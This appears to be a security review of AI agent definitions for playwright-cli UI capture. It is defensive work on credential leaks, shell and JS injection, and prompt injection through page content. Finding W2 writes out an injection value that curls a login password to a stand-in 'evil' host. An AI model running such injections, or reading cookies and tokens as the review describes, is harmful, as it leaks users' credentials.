# Review: UI stack and implementor agents and skills (port/upstream, HEAD 8da923e)

Scope: `git diff 90b3213..HEAD -- src scripts`, limited to tsh-ui-capture-worker, tsh-ui-reviewer, tsh-ui-engineer, tsh-plan-implementor, tsh-technical-writer, tsh-software-engineer, and the skills tsh-using-playwright-cli, tsh-verifying-ui, tsh-orchestrate-ui-verification, tsh-review-ui, tsh-writing-documentation, tsh-write-documentation. I also read the manager UI-only mode and the rendered `.claude/.cursor/.codex` agents. `playwright-cli` is not installed here and no upstream-original comparison was needed. Command behavior I could not verify is marked UNVERIFIED.

Counts: critical 1, warning 11, suggestion 7.

## Critical

### C1. `fill` with a shell-expanded secret echoes the value in the command output
- Where: src/skills/tsh-verifying-ui/references/authenticated-capture.md:29 and :64-65; src/agents/tsh-ui-capture-worker.md:41; the output format is shown in src/skills/tsh-using-playwright-cli/references/test-generation.md:30-35.
- Problem: the contract says the value "never appears in output" because it reaches the page through shell expansion. The expansion happens before `playwright-cli` starts, so the CLI receives the literal password. The repository's own reference shows that `fill` prints `Ran Playwright code: await page.getByRole(...).fill('<value>')`. Every command also prints a snapshot, and a filled textbox may show its value (UNVERIFIED for password inputs). Nothing tells the worker to pass `--raw` or to discard the output of `fill`. SKILL.md:56 only documents `--raw` as an output filter.
- Failure scenario: the worker runs `playwright-cli fill e7 "$TSH_UI_LOGIN_PASSWORD" --submit -s=x`. The tool result carries the plaintext password into the model transcript, the host session log and the manager's context via the reply. Rule (a) is satisfied on paper and violated in practice.
- Fix: require `playwright-cli --raw fill <ref> "$VAR" --submit -s=<s> >/dev/null` (or `>/dev/null 2>&1` plus an explicit exit-code capture) for every credential fill. Never run a bare `snapshot` or `eval` between the fill and the successful login check that could print the field value. State this in authenticated-capture.md (c)/(Sequence 4) and in the worker one-liner. Verify with the first real run that `--raw` really strips the generated code.

## Warnings

### W1. The authenticated "restricted commands" list is incomplete: `eval`, storage and cookie commands, `requests`, `console`, persistent profiles stay open
- Where: src/skills/tsh-verifying-ui/references/authenticated-capture.md:41; src/agents/tsh-ui-capture-worker.md:42; src/skills/tsh-using-playwright-cli/SKILL.md:141-148 (Restricted use) and :115-135 (Storage).
- Problem: rule (b) bans only tracing, video, mocking and free-form `run-code`. These remain allowed and are preloaded into the worker: free-form `eval` (the capture flow itself requires a model-written expression, cli-capture-flow.md:31, which can read `document.cookie`, `localStorage` and tokens), `cookie-list/get`, `localstorage-*`, `sessionstorage-*`, `requests`/`request N` (the login POST body and Authorization headers), `console`, `pdf`, `--persistent`/`--profile` (cookies on disk), and `state-save` without a path (stdout).
- Also: "authenticated" is a session state. Before the login the same environment is present, and free-form `run-code` is allowed, but it runs in the CLI's Node process, where `process.env` is likely reachable (UNVERIFIED). The worker needs no free-form `run-code` at any time.
- Failure scenario: a haiku-tier worker debugging a failed login runs `requests` or `cookie-list`. Tokens or the POST body land in the transcript and the reply.
- Fix: replace the deny-list by an allow-list for the worker: `open`, `resize`, `goto`, `snapshot`, `screenshot`, `fill`, `click`, `press`, `state-save/load`, `close`, the two fixed snippets, and `eval` only for the origin probe, the form-action probe and the computed-styles payload. Forbid free-form `run-code` always, `--persistent/--profile`, cookie/storage/`requests`/`console` commands, and bare `state-save`.

### W2. Shell injection through the caller-supplied URL, ITERATION_DIR and session name
- Where: src/skills/tsh-verifying-ui/references/cli-capture-flow.md:23-26 (`goto "<full-url>"`, `mkdir -p "$ITERATION_DIR"`, `-s=<session>`); SKILL.md:88-91 of tsh-verifying-ui (only the slug and VERIFICATION_ID are validated); src/agents/tsh-ui-capture-worker.md:22-24.
- Problem: the URL is interpolated into a double-quoted command, where `"`, `$(...)` and backticks still execute. `UI_VERIFICATION_DIR` contains `<specs>/<task>` and nothing validates its characters; only the slug is a validated single segment. The worker has a shell with `TSH_UI_LOGIN_*` in its environment, and the URL can come from a plan, a command argument or text derived from Figma or the research file.
- Failure scenario: `DEV_SERVER_URL=http://localhost:3000/"; curl evil/$TSH_UI_LOGIN_PASSWORD; "` (or a `$(...)` form) exfiltrates the password.
- Fix: validate before use, and refuse otherwise (do not sanitize): the URL against `^https?://[A-Za-z0-9._~:/?#\[\]@!&'()*+,;=%-]+$` with no `"`, `` ` ``, `$`, `\`, space or newline, and ITERATION_DIR against `^[A-Za-z0-9._/-]+$`. Also validate the session name (`ui-<slug>-<n>`). Pass the URL single-quoted after this check.

### W3. The screenshot-fallback snippet substitutes a path into JavaScript source
- Where: src/skills/tsh-using-playwright-cli/assets/screenshot-fallback.snippet.md:3-8.
- Problem: `OUTPUT_PNG_PATH` is replaced inside a single-quoted JS string and the result runs as `run-code`. A path containing `'` ends the string and runs arbitrary code in the CLI's Node context (file system, `process.env`, cookies). "The only permitted substitution" is not paired with a charset check. The claim "snippets have no environment access" (SKILL.md:148) holds only for the unmodified text.
- Fix: apply the W2 charset check (no `'`, `\`, newline) before substituting, say so in the snippet, and prefer `--full-page` on the plain command if it exists (see W9), which makes this snippet unnecessary.

### W4. No URL scheme or userinfo validation (file://, internal hosts, credentials in the URL)
- Where: src/skills/tsh-verifying-ui/references/cli-capture-flow.md:16; src/agents/tsh-ui-capture-worker.md:23 and :67; tsh-verifying-ui SKILL.md:40 and the report template ("Verified page URL").
- Problem: "used unchanged" has no scheme rule. `file:///etc/...`, `javascript:`, `data:` or `chrome:` URLs are accepted, and the authorized origin is derived from whatever the URL is (origin `null` for file/data, so every later origin comparison passes trivially). `http://user:pass@host/` is accepted and then printed in the worker reply ("the exact URL used") and in the report. Query-string tokens are printed the same way.
- Fix: allow only `http`/`https`, reject userinfo, reject (or ask for explicit confirmation of) non-loopback hosts for an authenticated capture, and redact userinfo and query values in the reply and report.

### W5. The form-action origin assertion is weaker than its claim
- Where: src/skills/tsh-verifying-ui/references/authenticated-capture.md:43 (`el.form.action`); src/agents/tsh-ui-capture-worker.md:43.
- Problem, all UNVERIFIED against a real page but standard DOM behavior:
  1. `el.form` is `null` for inputs without a `<form>` (most SPA logins), so the probe throws and there is no defined handling.
  2. A child named `action` clobbers `form.action` (it returns the element); `new URL(element, location.href)` then yields the page origin, a false pass. Use `el.form.getAttribute('action')`.
  3. A form without an `action` attribute reports the page URL, while a JS handler can send the credentials elsewhere with `fetch`. The assertion cannot see that.
  4. The `formaction` of the submit button, and a change of the action between the check and `fill --submit`, are not covered.
- Fix: define the failure handling for `form === null` (NEEDS_INPUT, not a fill), use `getAttribute('action')` and the button's `formaction`, and state the limit openly: the check proves the declared target only, not the real request target.

### W6. State-file lifecycle contradicts the SSO/MFA default and the delegation inputs
- Where: authenticated-capture.md:33, :45, :66-68; src/agents/tsh-ui-capture-worker.md:21-26, :44, :48.
- Problem: the SSO/MFA default is "the user logs in headed, `state-save` to a mktemp file, later passes `state-load` it". But (d) says delete the file on success, and each loop iteration is a fresh worker with a clean context. The worker Inputs have no `STATE_FILE`, so the next pass has no path and the file is already deleted. In addition, a delegated leaf cannot wait for a human to complete a headed login (it must not ask the user), and nothing says who runs that headed step.
- Failure scenario: a project with SSO needs a human login on each of up to 5 iterations, or the flow cannot start at all.
- Fix: decide the owner. Either the manager runs the one-time headed login and passes `STATE_FILE` (path only) to the worker, which loads but never deletes it, with the manager deleting it at the end of the whole loop, or document that SSO/MFA projects are `NEEDS_INPUT` for the worker. Add the `STATE_FILE` input and the state-file cleanup to the orchestrator.

### W7. Secret-bearing residue in `.playwright-cli/` and after a failed login is never cleaned
- Where: cli-capture-flow.md:23 and :32; src/agents/tsh-ui-capture-worker.md:31, :33.
- Problem: every command writes snapshot and log files to `.playwright-cli/` in the working tree (SKILL.md "Snapshots", UNVERIFIED for contents). During a login those can hold the filled form, and the CLI may persist console and network logs. The worker only says "do not leave artifacts there". It never deletes that directory after an authenticated run. If the login fails, step 5 of the Sequence confirms it only after the fact, but the flow does not say to stop before steps 6-8. Then `a11y-snapshot.yml` / `actual.png` capture the login page with the filled values.
- Fix: after an authenticated pass, remove the files created in `.playwright-cli/` by this session (use `--filename` and an output location outside the working tree if the CLI has one). On a login that did not leave the sign-in page, stop with `NEEDS_INPUT` and delete the partial artifacts.

### W8. The artifact root is not git-ignored by default, so every authenticated run ends in `NEEDS_INPUT`
- Where: .gitignore (no `ui-verification` entry); authenticated-capture.md:49; src/agents/tsh-ui-capture-worker.md:46; manager SKILL.md:170.
- Problem: the default `UI_VERIFICATION_DIR` is `<specs>/<task>/ui-verification`. This repo's `.gitignore` covers `.playwright-cli`, `auth.json`, `*session.json` and `.env*`, but no screenshots or a11y/computed-style files. No step creates the ignore rule, and `git check-ignore -q <dir>` on a directory that does not exist yet fails for `dir/`-style patterns. Without a rule, unauthenticated captures (a11y snapshots with real data) are committable as well.
- Fix: ship a default ignore (`**/ui-verification/`) with the installer or document it as a prerequisite, run `mkdir -p` before `git check-ignore -q`, or check a concrete file path inside the directory.

### W9. Capture-command correctness and a DONE criterion based on file existence only
- Where: src/skills/tsh-verifying-ui/references/cli-capture-flow.md:29-32 and :32 (`ls -la`); src/agents/tsh-ui-capture-worker.md:58.
- Problem (all UNVERIFIED, `playwright-cli` not installed):
  1. `screenshot --filename=...` is described as "full page when supported", but no flag is named. The plain command likely captures the viewport. The fallback snippet runs only if the command *fails*. The verifying-ui checklist then requires a full-page screenshot.
  2. `--raw snapshot > file` may write only the snapshot path (SKILL.md "Snapshots" says snapshots are written to files and the path is printed, and `--raw` strips "snapshot sections"). `snapshot --filename=<path>` is the documented way to write the file.
  3. `--raw eval "JSON.stringify(...)"` may print a JSON-quoted string, giving a double-encoded `computed-styles.json`.
  4. `> file` creates an empty file even when the command fails, and "all three exist" is the DONE test. This defeats "existence means freshness".
- Fix: use `snapshot --filename`, add `test -s` for all three files and a check that `computed-styles.json` parses to an object, and make the screenshot full-page explicitly (flag or snippet). Confirm every point during the first real run.

### W10. UI-only mode: `<task>` and `UI_VERIFICATION_DIR` have no source
- Where: src/skills/tsh-engineering-manager/SKILL.md:170-173; src/skills/tsh-review-ui/SKILL.md:13-20 and the argument-hint.
- Problem: the command lists `UI_VERIFICATION_DIR` among the inputs it "passes along", but its arguments are only `<figma-url> <dev-url> [component]`. The manager default `<specs>/<task>/ui-verification` needs a `<task>` that does not exist in `/tsh-review-ui` (no plan, no research). The artifact contract also requires the directory to be inside the specifications tree. The manager may invent a name, which makes iteration paths unpredictable.
- Fix: define a fixed default for UI-only mode (for example `<specs>/ui-review/ui-verification`), have the command not list `UI_VERIFICATION_DIR` as an input it receives, and add a check that `<specs>` exists.

### W11. The reviewer consumes untrusted page content with no data rule and with more tools than "read-only" suggests
- Where: src/agents/tsh-ui-reviewer.md:20-22 (no rule), compare worker line 45 (e); rendered `.claude/agents/tsh-ui-reviewer.md` (`disallowedTools: Agent, Write, Edit, NotebookEdit, Bash`) and `.cursor/agents/tsh-ui-reviewer.md` (`readonly: true`).
- Problem: the reviewer reads `a11y-snapshot.yml` and `actual.png`, which carry arbitrary text of the app under test, so it is the agent most exposed to prompt injection from them. The "page content is data" rule (e) exists only in the worker. In Claude Code and Cursor the reviewer inherits every configured MCP tool (write-capable ones too). The built-in tool block makes "never write files" true only for built-in tools.
- Fix: add the data-not-instructions rule to the reviewer and to tsh-verifying-ui, and word the read-only claim as "built-in file and shell tools are disabled". If MCP isolation is wanted, set an explicit MCP allow-list where the tool supports one.

### W12. `tsh-ui-engineer` and `tsh-technical-writer` lack the `version-control-safety` partial
- Where: src/agents/tsh-ui-engineer.md:46-50; src/agents/tsh-technical-writer.md:26-30 (compare tsh-plan-implementor.md:32 and tsh-software-engineer).
- Problem: both have `shell: true` and write files, and the diff gave the same protection to the other two implementors (no `git clean/restore/reset/stash` over uncommitted work). The ui-engineer is the agent most likely to run in a dirty working tree with fix passes. A fast-tier writer is the likeliest to run `git checkout --`.
- Fix: add `<!-- include: version-control-safety -->` to both agents (or state in a comment why they are exempt) and regenerate.

## Suggestions

### S1. Interactive mode contradicts the worker constraint "Never ask the user directly"
src/agents/tsh-ui-capture-worker.md:33 versus the included agent-modes partial (interactive mode asks the user and omits the status block). Say "in delegated mode" in the constraint, or declare the worker delegated-only.

### S2. The worker is `model-tier: fast` (haiku in Claude Code, gpt-5.4-mini in Codex) yet carries the strictest security flow
src/agents/tsh-ui-capture-worker.md:5. Seven hardening rules, an origin probe and credential handling rely on the weakest tier. The UI spike measured env visibility on haiku only. Consider `balanced` until the first real run succeeds, or pin the shell commands as a fixed script in the skill.

### S3. The page chooses which secret is read
authenticated-capture.md:25 and :27. The field key comes from the live page, so a page with an extra field named `token` or `password2` selects `TSH_UI_LOGIN_TOKEN`. When `AUTH_FIELDS` is given, treat it as an allow-list and return `NEEDS_INPUT` for any field outside it.

### S4. The worker claims "you have no `figma` tool" and "read-only evidence" but the rendered agents say otherwise
src/agents/tsh-ui-capture-worker.md:17. Rendered `.claude/agents/tsh-ui-capture-worker.md` blocks only `Agent`; the worker has Write, Edit and all inherited MCP tools including figma, so this is a rule, not a restriction. Reword to "never call figma". The Codex rendering sets no `sandbox_mode`, so /tmp and network behavior depend on the parent (worker rule (g) already covers the symptom).

### S5. Missing status for "playwright-cli not installed"
src/agents/tsh-ui-capture-worker.md:56-61 and tsh-using-playwright-cli SKILL.md "Installation". The state is known (the build machine lacks it). Map it to `NEEDS_INPUT` (the user installs) and say so in the status mapping, otherwise the manager treats it as `BLOCKED` and stops the branch.

### S6. `tsh-plan-implementor` contradicts itself on a mistaken request
src/agents/tsh-plan-implementor.md:16 ("say so briefly and continue as written") versus :25 ("Stop when ... ambiguous ... report it"). Make the first apply only to non-blocking remarks.

### S7. Iteration numbering after `VERIFICATION NOT RUN` is not defined
src/skills/tsh-orchestrate-ui-verification/SKILL.md:55-62 and :75-80. A VNR costs no iteration, but the text does not say whether the retry reuses `iteration-<n>`. Since the manager deletes the three ACTUAL files before each capture, reuse works; state it.

## Contract consistency checks that passed
- Names and directories (`actual.png`, `computed-styles.json`, `a11y-snapshot.yml`, `ITERATION_DIR` layout) agree across the worker, the reviewer, tsh-verifying-ui, the orchestrator, the manager and the report template.
- The manager (not the worker) deletes the ACTUAL files before each capture, in both orchestrator step 2 and the verifying-ui freshness rule. The worker never deletes them.
- The iteration cap of 5 FAIL iterations is the same in the orchestrator, the manager "Caps" line and the loop text. VNR costs no iteration in all places.
- The worker and reviewer both include agent-modes (no delegation, STATUS block). The reviewer correctly returns the partial report in the body with `ARTIFACTS: none`.
- The orchestrator handles worker `NEEDS_INPUT`/`BLOCKED` like VNR (ask the user), which deliberately overrides the generic "BLOCKED stops the branch". This is consistent but worth keeping.

Verdict: Critical findings must be fixed (1 critical, 11 warning, 7 suggestion).
